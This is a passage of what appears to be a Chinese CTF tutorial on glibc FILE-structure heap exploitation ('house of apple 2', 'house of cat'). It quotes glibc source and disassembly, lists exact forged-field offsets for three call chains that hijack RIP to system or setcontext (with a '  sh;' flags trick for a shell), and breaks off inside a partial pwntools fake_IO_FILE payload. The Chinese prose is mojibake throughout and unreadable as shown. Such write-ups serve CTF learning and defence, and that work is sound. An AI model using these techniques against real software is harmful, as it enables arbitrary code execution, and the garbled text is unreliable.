<p>vtable å‡½æ•°è°ƒç”¨è¿‡ç¨‹ï¼Œå°±æ˜¯è°ƒç”¨è·³è¡¨ï¼Œæ¯”å¦‚è¯´è°ƒç”¨ <code>__overflow</code> </p>
<ul>
<li><code>IO_validate_vtable</code>å‡½æ•°è´Ÿè´£æ£€æŸ¥<code>vtable</code>çš„åˆæ³•æ€§ï¼Œä¼šåˆ¤æ–­<code>vtable</code>çš„åœ°å€æ˜¯ä¸æ˜¯åœ¨ä¸€ä¸ªåˆæ³•çš„åŒºé—´ã€‚å¦‚æœ<code>vtable</code>çš„åœ°å€ä¸åˆæ³•ï¼Œç¨‹åºå°†ä¼šå¼‚å¸¸ç»ˆæ­¢ã€‚</li>
<li>æœ€åå°±æ˜¯è°ƒç”¨ vtable é‡Œé¢çš„å‡½æ•°</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))a</span></span><br></pre></td></tr></table></figure>

<p>æ£€æŸ¥å‡½æ•°</p>
<ul>
<li>æ£€æŸ¥æ­¤ç»“æ„ä½“çš„ vtable ä¸ <code>__io_vtables</code> å…¨å±€å˜é‡è¡¨åç§»</li>
<li>åœ¨è¿™ä¸ªè¡¨é‡Œçš„è¡¨å°±èƒ½é€šè¿‡æ£€æŸ¥ã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ç°åœ¨åŠ«æŒvtableéƒ½å·®ä¸å¤šåœ¨è¿™ä¸ªè¡¨é‡Œæ‰¾ä¸€ä¸ªèƒ½ç¬¦åˆæ¡ä»¶çš„è¡¨è¿›è¡Œåˆ©ç”¨ã€‚</p>
<p>æ¯”å¦‚æŒŸæŒåˆ° <code>_wide_data</code> ç›¸å…³çš„è¡¨ï¼Œå› ä¸ºè¿™ä¸ªè¡¨å«æœ‰vtableï¼Œå¹¶ä¸”å‡½æ•°è°ƒç”¨æ²¡æœ‰æ£€æŸ¥ã€‚</p>
<ul>
<li>è€Œä¸å…¶ç›¸å…³çš„è¡¨æœ‰3ä¸ª æ‰¾ <code>_IO_wfile_jumps</code> å¼€å¤´çš„è¡¨å­˜åœ¨ä¸‰ä¸ª</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><blockquote>
<p>æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼Œè¿™é‡Œæ˜¯ version 2.0ï¼Œæ§åˆ¶å‡½æ•°æ‰§è¡Œæµã€‚</p>
</blockquote>
<ol>
<li>IO æµï¼šexit æˆ–è€… malloc_assert</li>
<li>èƒ½æ³„éœ²å‡ºÂ <code>heap</code>Â åœ°å€å’ŒÂ <code>libc</code>Â åœ°å€ </li>
<li>èƒ½ä½¿ç”¨ä¸€æ¬¡Â <code>largebin attack</code>ï¼ˆä¸€æ¬¡å³å¯ï¼‰</li>
</ol>
<p>wide_data ç»“æ„ä½“</p>
<ul>
<li>å…¶ä¸­ä¹Ÿå­˜åœ¨ä¸€ä¸ª vtable</li>
<li>ç”±ä¸Šé¢çš„FSOPçŸ¥é“ï¼Œåœ¨è°ƒç”¨<code>_wide_vtable</code>è™šè¡¨é‡Œé¢çš„å‡½æ•°æ—¶ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨å®å»è°ƒç”¨ï¼Œä½†æ˜¯æ²¡æœ‰æ£€æŸ¥ï¼Œå› æ­¤æ›´å¥½åˆ©ç”¨</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾åŠ«æŒäº†vtable åˆ° <code>IO_wdata_jumps</code> ä¹‹åï¼Œè°ƒç”¨overflow</p>
<ul>
<li>å› ä¸ºæ˜¯å®å±•å¼€ï¼Œè¿›å…¥ <code>_IO_wfile_jumps</code> çš„ overflow å‡½æ•°ã€‚</li>
<li>è€Œè¿™ä¸ªå‡½æ•°æ‰§è¡Œæµå¦‚ä¸‹</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span> _IO_wfile_overflow(FILE *f, <span class="type">wint_t</span> wch) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> ||</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>) &#123;</span><br><span class="line">      _IO_wdoallocbuf(f);</span><br><span class="line">      _IO_free_wbackup_area(f);</span><br><span class="line">      _IO_wsetg(f, f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span></span><br><span class="line"><span class="comment">         (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting</span></span><br><span class="line"><span class="comment">         the read pointers to all point at the beginning of the</span></span><br><span class="line"><span class="comment">         block).  This makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving</span></span><br><span class="line"><span class="comment">         that alone, so it can continue to correspond to the</span></span><br><span class="line"><span class="comment">         external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end) &#123;</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF) <span class="keyword">return</span> _IO_do_flush(f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) ||</span><br><span class="line">      ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="string">L&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span>(_IO_wfile_overflow)</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦çœ‹å…¶ä¸­çš„å‡½æ•°è°ƒç”¨ï¼Œè¿™é‡Œä¸»è¦çœ‹ä½œè€…çš„å‡ æ¡è¿</p>
<p>é“¾1ï¼š<code>_IO_wfile_overflow</code> æ§åˆ¶å‡½æ•°æ‰§è¡Œæµï¼Œä½†æ˜¯éœ€è¦ç»•è¿‡æŸäº›æ£€æŸ¥ã€‚ä¼ªé€ fp</p>
<ul>
<li><code>_flags</code>è®¾ç½®ä¸º<code>~(2 | 0x8 | 0x800)</code>ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶<code>rdi</code>ï¼Œè®¾ç½®ä¸º<code>0</code>å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—<code>shell</code>ï¼Œå¯è®¾ç½®ä¸º<code>  sh;</code>ï¼Œå‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼</li>
<li><code>vtable</code>è®¾ç½®ä¸º<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wfile_overflow</code>å³å¯</li>
<li><code>_wide_data</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>A</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>B</code>ï¼Œå³æ»¡è¶³<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>è®¾ç½®ä¸ºåœ°å€<code>C</code>ç”¨äºåŠ«æŒ<code>RIP</code>ï¼Œå³æ»¡è¶³<code>*(B + 0x68) = C</code>ï¼Œæ¯”å¦‚è¯´Cä¸ºsystemå‡½æ•°</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>é“¾2ï¼š<code>_IO_wfile_underflow_mmap</code> æ§åˆ¶å‡½æ•°æ‰§è¡Œæµ</p>
<ul>
<li><code>_flags</code>è®¾ç½®ä¸º<code>~4</code>ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶<code>rdi</code>ï¼Œè®¾ç½®ä¸º<code>0</code>å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—<code>shell</code>ï¼Œå¯è®¾ç½®ä¸º<code> sh;</code>ï¼Œæ³¨æ„å‰é¢æœ‰ä¸ªç©ºæ ¼</li>
<li><code>vtable</code>è®¾ç½®ä¸º<code>_IO_wfile_jumps_mmap</code>åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wfile_underflow_mmap</code>å³å¯</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>ï¼Œå³æ»¡è¶³<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>A</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>ï¼Œå³æ»¡è¶³<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>è®¾ç½®ä¸º<code>0</code>æˆ–è€…åˆæ³•çš„å¯è¢«<code>free</code>çš„åœ°å€ï¼Œå³æ»¡è¶³<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>B</code>ï¼Œå³æ»¡è¶³<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>è®¾ç½®ä¸ºåœ°å€<code>C</code>ç”¨äºåŠ«æŒ<code>RIP</code>ï¼Œå³æ»¡è¶³<code>*(B + 0x68) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>é“¾3ï¼š<code>_IO_wdefault_xsgetn</code> æ§åˆ¶å‡½æ•°æ‰§è¡Œæµ</p>
<ul>
<li><code>_flags</code>è®¾ç½®ä¸º<code>0x800</code></li>
<li><code>vtable</code>è®¾ç½®ä¸º<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wdefault_xsgetn</code>å³å¯</li>
<li><code>_mode</code>è®¾ç½®ä¸ºå¤§äº<code>0</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>A</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>B</code>ï¼Œå³æ»¡è¶³<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>è®¾ç½®ä¸ºåœ°å€<code>C</code>ç”¨äºåŠ«æŒ<code>RIP</code>ï¼Œå³æ»¡è¶³<code>*(B + 0x18) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>



<p>æ€»ç»“ä¸€ä¸‹ï¼šä½¿ç”¨Â <code>largebin attack</code>Â åŠ«æŒ<code>_IO_list_all</code>Â å˜é‡</p>
<ul>
<li>å°†å…¶æ›¿æ¢ä¸ºä¸€ä¸ªä¼ªé€ çš„Â <code>IO_FILE</code>Â ç»“æ„ä½“ï¼ˆæŸä¸ªæˆ‘ä»¬å¯æ§å†…å®¹çš„å †ï¼‰</li>
<li>IO_FILEçš„ <code>_wide_data</code> ä¼ªé€ ä¸ºå¯æ§çš„å †åœ°å€ç©ºé—´ï¼Œè¿›è€Œæ§åˆ¶<code>_wide_data-&gt;_wide_vtable</code>ä¸ºå¯æ§çš„å †åœ°å€ç©ºé—´</li>
<li>IO_FILEçš„ <code>vtable</code> ä¼ªé€ ä¸º <code>_IO_wfile_jumps</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª const å˜é‡, gdbä½¿ç”¨<code>p &amp;_IO_wfile_jumps</code>æŸ¥çœ‹</li>
<li>åœ¨éœ€è¦å†™shellcodeæ—¶ï¼Œå°†Cè®¾ç½®ä¸ºä¸€ä¸ªå†™æ»¡ROPçš„å †åœ°å€å°±è¡Œã€‚å¸¸ä½¿ç”¨setcontext</li>
</ul>
<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>å‡½æ•°è°ƒç”¨é“¾</p>
<ul>
<li><code>_IO_wfile_jumps</code>ä¸­çš„<code>_IO_wfile_seekoff</code>å‡½æ•°ï¼Œç„¶åè¿›å…¥åˆ°<code>_IO_switch_to_wget_mode</code>å‡½æ•°ä¸­æ¥æ”»å‡»</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__malloc_assert</span><br><span class="line">	â€‹__fxprintf</span><br><span class="line">		â€‹locked_vfxprintf</span><br><span class="line">			__vfprintf_internal #åœ¨è¿™é‡Œæ˜¯è·³è½¬åˆ°IO_validate_vtableé€šè¿‡vtable+<span class="number">0x38</span>è°ƒç”¨çš„ä¸‹é¢å‡½æ•°</span><br><span class="line">				â€‹_IO_wfile_seekoff</span><br><span class="line">					_IO_switch_to_wget_mode</span><br><span class="line">						â€‹call qword ptr [rax + <span class="number">0x18</span>] <span class="meta">#raxæ˜¯ä¼ªé€ çš„io_fileçš„åœ°å€</span></span><br></pre></td></tr></table></figure>


<p>å¹¶ä¸”house of catåœ¨<strong>FSOP</strong>çš„æƒ…å†µä¸‹ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œåªéœ€ä¿®æ”¹è™šè¡¨æŒ‡é’ˆçš„åç§»æ¥è°ƒç”¨<code>_IO_wfile_seekoff</code>å³å¯ï¼ˆé€šå¸¸æ˜¯ç»“åˆ<code>__malloc_assert</code>ï¼Œæ”¹vtableä¸º<code>_IO_wfile_jumps+0x10</code>ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))   <span class="comment">// xxxx</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure>


<p>åœ¨è¿™é‡Œè°ƒç”¨ <code>_wide_data</code> é‡Œçš„ <code>vtableçš„_overflow</code>ï¼ŒJUMPå® ä¸”æ²¡æœ‰æ£€æŸ¥</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>_IO_switch_to_wget_mode</code> è°ƒè¯•æ—¶å‘ç°å¦‚ä¸‹çš„æ±‡ç¼–ä»£ç </p>
<ul>
<li>rdi æ˜¯ fp æŒ‡é’ˆï¼Œæ˜¯æˆ‘ä»¬å¯ä»¥ä¼ªé€ çš„ä¸€ä¸ª IO_FILEã€‚</li>
<li>é€šè¿‡ rdiæ§åˆ¶ raxï¼Œåœ¨é€šè¿‡raxæ§åˆ¶rdxï¼Œä¹Ÿå¯ä»¥è¿‡jbeæŒ‡ä»¤ã€‚ä»è€Œæœ€åcall æˆ‘ä»¬æŒ‡å®šçš„shellcode</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line"> <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line"> <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line"> <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line"> <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æœ€åçš„ä¼ªé€ å¦‚ä¸‹</p>
<ul>
<li>rax1 ä¸ºä¸Šé¢çš„rax</li>
<li>rax2 ä¸ºä¸‹é¢çš„raxå¯„å­˜å™¨</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span>                        <span class="comment"># ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)                              <span class="comment"># _flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>)                        <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)               <span class="comment"># _IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)                       <span class="comment"># _IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                               <span class="comment"># 